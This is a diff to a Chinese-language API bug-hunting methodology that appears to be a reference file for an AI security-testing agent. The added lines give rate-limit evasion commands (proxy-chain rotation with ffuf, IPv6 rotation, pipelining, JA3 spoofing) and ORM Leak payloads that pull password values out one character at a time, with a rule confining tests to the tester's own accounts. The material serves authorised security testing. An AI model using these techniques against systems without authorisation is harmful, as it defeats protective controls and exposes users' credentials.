@@ -6,7 +6,7 @@
 - [MyuriKanao/src-hunter-skill](https://github.com/MyuriKanao/src-hunter-skill)
 - [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter)
 - [SnailSploit/Claude-Red](https://github.com/SnailSploit/Claude-Red)
-- 权威公开源：OWASP API Top 10 / PortSwigger（仅作背景）
+- 权威公开源：OWASP API Top 10 / PortSwigger（仅作背景）/ [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)（ORM Leak / Brute Force Rate Limit 章节）
 
 ---
 
@@ -97,7 +97,7 @@ __v / _id / password_hash / permissions:["read","write","delete"]
 {"isAdmin":1}  {"isAdmin":"true"}  {"roles":"admin"}
 ```
 
-**原型污染（Node 后端合并对象时）** `[Claude-BugHunter hunt-api-misconfig]`：
+**原型污染（Node 后端合并对象时）** `[Claude-BugHunter hunt-api-misconfig]`：完整方法论（Express 黑盒检测 / CSPP / gadget→RCE 链）→ Read `references/playbooks/prototype-pollution.md`：
 
 ```text
 {"__proto__":{"polluted":"pp-1337"}}
@@ -115,7 +115,16 @@ for i in $(seq 1 100); do curl -s -o /dev/null -w "%{http_code}\n" http://target
 curl -H "X-Forwarded-For: 1.2.3.$i" http://target.com/api/test
 # 其他头：X-Real-IP / X-Originating-IP / X-Remote-IP / X-Client-IP / True-Client-IP
 # 或：多 API Key 轮换 / 多账户 token / UA 轮换
+
+# 代理池轮换（proxychains random_chain，每请求走不同出口）[PayloadsAllTheThings Brute Force Rate Limit]
+# proxychains.conf: random_chain + chain_len=1 + 多个 socks5/http 代理
+proxychains ffuf -w wordlist.txt -u https://target.tld/FUZZ
+
+# IPv6 /64 轮换：云厂商 /64 段 = 2^64 个地址，注册前缀后随机源地址 [PayloadsAllTheThings]
+# HTTP pipelining：单 TCP 连接连发请求不等待响应，绕"连接数"型限速 [PayloadsAllTheThings]
 ```
+
+**JA3 指纹对抗（限速按 TLS 指纹识别 Burp/脚本时）** `[PayloadsAllTheThings]`：Burp 的 JA3 是已知值（`53d67b2a806147a7d1d5df74b54dd049` 等）——工具被识别则换 [curl-impersonate](https://github.com/lwthiker/curl-impersonate) 伪装浏览器 TLS 握手，或浏览器驱动自动化。
 
 ### 4.4 CORS 配置错 `[本地 src-hunter api-rest 00-index + Claude-BugHunter hunt-cors]`
 
@@ -155,6 +164,25 @@ curl -s "http://web.archive.org/cdx/search/cdx?url=target.com/*swagger*&output=j
 curl -s -H "Authorization: Bearer $EXPIRED_TOKEN" https://target/api/v1/users/me -w '\n%{http_code}\n'
 curl -s -H "Authorization: Bearer $EXPIRED_TOKEN" https://target/api/v2/users/me -w '\n%{http_code}\n'
 ```
+
+### 4.6 ORM Leak（过滤参数直通 ORM）`[PayloadsAllTheThings ORM Leak 章节]`
+
+**触发**：API 的过滤/排序参数直接变成 ORM 查询条件（Django `filter(**request.data)`、Prisma `where`、Ruby Ransack `Product.ransack(params)`）——JSON 键名可控即列名/运算符可控。
+
+```json
+// Django：__startswith/__contains/__regex 运算符 + 列名直通
+{"username": "admin", "password__startswith": "p"}
+
+// Django 关系穿越：跨表过滤（user → created_by → password）
+{"created_by__user__password__contains": "p"}
+// Many-to-Many 同理：created_by__departments__employees__user__id 先取 ID 再逐个过滤
+
+// Prisma / Ransack：等价的关系过滤语法，按框架文档变换键名
+```
+
+**测试入口**：API 接受形如 `?password__startswith=p`、body `{"filter":{"password":{"startsWith":"p"}}}` 的动态过滤。列名/运算符探测：注入不存在的键名（如 `{"nonexistent__startswith":"a"}`）看是否产生**可差分的报错/响应变化**（Django 对未知关键字抛 FieldError——框架行为，当场验证后再依赖，勿凭记忆断言报错原文）。效果 = 免 SQLi 的**数据提取**（逐字符前缀比较），Prisma 场景另有 ReDoS 报错泄露变体。
+
+**纪律**：只对自测账号字段做前缀比较证明；不跨用户提取他人密码哈希。
 
 ## 5. 工具用法
 
